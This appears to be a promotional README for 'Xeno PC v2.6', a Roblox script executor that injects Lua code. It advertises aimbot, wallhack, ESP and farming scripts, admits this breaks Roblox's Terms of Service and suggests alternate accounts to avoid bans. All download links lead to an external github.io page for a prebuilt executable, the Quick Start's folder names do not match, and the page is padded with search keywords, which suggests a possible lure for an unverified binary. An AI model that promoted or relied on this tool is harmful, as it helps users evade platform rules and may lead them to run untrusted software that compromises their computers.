# Xeno PC v2.6 - Roblox Script Executor 2026

> **A compact Windows Lua script injector for Roblox.** Run custom scripts, open a curated hub with 500+ community scripts, and use a clean desktop UI with auto-update support, all free and with no activation key required.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathanx1999/xeno-windows-script-hub?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://nathanx1999.github.io/xeno-windows-script-hub/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Xeno%20PC-v2.6%20Latest-brightgreen?style=for-the-badge" alt="Download Xeno PC">
  </a>
</p>

> **[Direct Download - Xeno PC v2.6](https://nathanx1999.github.io/xeno-windows-script-hub/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://nathanx1999.github.io/xeno-windows-script-hub/)

---

## About Xeno PC

Xeno PC is a Roblox script executor for Windows that gives players and developers a simple way to run Lua code inside Roblox games. In v2.6, the injection flow has been updated to keep pace with the newest Roblox changes, so scripts can load fast and consistently without adding unnecessary overhead. The app stays lightweight on the system while still offering a complete script handling workflow.

It is not limited to execution alone. Xeno PC also ships with a built-in script hub that brings together more than 500 community-submitted scripts for well-known Roblox experiences. With multi-language interface support, it is easier to use across different regions. Whether you are experimenting with gameplay logic or browsing community tools, Xeno PC provides a low-friction path into Roblox Lua scripting.

---

## Highlights

- **Single-Click Injection** - Launch scripts into a Roblox session with one action, skipping complicated setup.
- **Integrated Script Hub** - Explore and load a hand-picked library of 500+ scripts sorted by game and purpose.
- **SQLite-Persisted Queue** - Keep your script queue saved locally so preferred entries remain available between sessions.
- **Automatic Update Checks** - On startup, the app looks for updates and applies fixes automatically to preserve compatibility.
- **Language Options** - Change the UI language to English, Spanish, Portuguese, and additional supported languages.
- **Small Resource Usage** - Runs at under 50 MB of RAM while idle, which helps on lower-end systems.
- **Sequential Batch Runs** - Queue several scripts and execute them in order without needing to click through each one.
- **Built-in Debug Tools** - Review output, inspect error logs, and step through execution when troubleshooting scripts.

---

## Supported Games & Scripts

| Game | Script Categories |
|------|-------------------|
| Adopt Me! | Pet automation, trading utilities, currency farming |
| Brookhaven RP | Roleplay enhancements, vehicle mods, teleport scripts |
| Tower of Hell | Auto-obstacle, speed adjustments, checkpoint bypass |
| Jailbreak | Prison escape helpers, vehicle spawners, cash farms |
| Blox Fruits | Auto-farming, fruit finder, combo macros |
| Arsenal | Aimbot helpers, weapon skins, kill effect scripts |
| Generic Hub | Universal scripts for ESP, fly, speed, and teleport |

---

## System Requirements

| Component | Minimum |
|-----------|---------|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Processor | Intel Core i3 / AMD Ryzen 3 or equivalent |
| RAM | 4 GB |
| Storage | 150 MB available space |
| .NET Framework | .NET 6.0 Runtime or higher |
| Roblox | Latest version installed |

---

## Quick Start

You can clone the repo and start the executor from the built executable:

```bash
git clone https://github.com/nathanx1999/xeno-windows-script-hub.git
cd Xeno-Exec-v2.6
.\XenoExecutor.exe
```

If you prefer, grab the prebuilt binary from the [releases page](https://nathanx1999.github.io/xeno-windows-script-hub/) and run it directly with no extra dependencies.

---

## Script Hub - Popular Searches 2026

- Auto-farm scripts for Blox Fruits and Anime Adventures
- ESP and wallhack utilities for competitive games
- Infinite yield admin commands and server management tools
- Teleport and speed hacks for open-world Roblox experiences
- GUI-based script loaders with customizable hotkeys
- Anti-afk and auto-collect scripts for grinding games
- Universal keyless script injectors for legacy Roblox versions

---

## Project Structure

```
Xeno-Exec-v2.6/
├── XenoExecutor.exe          # Main application executable
├── config.json               # User settings and preferences
├── scripts/                  # Local script storage directory
│   ├── hub/                  # Cached script hub data
│   └── user/                 # User-imported scripts
├── updates/                  # Auto-downloaded update packages
├── logs/                     # Execution and error logs
├── lib/                      # Core DLL dependencies
│   ├── inject.dll            # Lua injection module
│   ├── sqlite3.dll           # Database engine
│   └── net6.0/               # .NET runtime components
└── README.md                 # This file
```

---

## FAQ

**Is Xeno PC safe to use?**  
There is no known malware included in the application, but any third-party Roblox tool carries some level of risk. Check the source and proceed at your own discretion.

**Does it work with the latest Roblox updates?**  
Yes. The auto-update system is designed to patch compatibility issues within 24 to 48 hours after major Roblox updates.

**How does Xeno PC compare to other executors?**  
Its emphasis is on a free, keyless, lightweight workflow with a built-in script hub. It does not include every advanced option found in paid executors, but it is positioned as a practical free alternative with strong performance.

**Can my Roblox account get banned?**  
Script executors go against Roblox's Terms of Service, so bans are possible. While non-disruptive scripts are less likely to trigger action, it is still wise to use alternate accounts for testing.

**Where are my scripts stored?**  
Scripts are kept locally in the `scripts/` folder. The queue uses SQLite, while individual scripts are saved as plain text files.

---

## Roadmap - 2026

- [x] One-click injection and script hub integration
- [x] Multi-language UI support (English, Spanish, Portuguese)
- [x] SQLite-based persistent script queue
- [ ] Cloud script sync across multiple devices
- [ ] Custom script editor with syntax highlighting
- [ ] Expanded API for advanced script developers
- [ ] Community script rating and reporting system

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Execute freely. Script smart. Stay lightweight.</i>
</p>
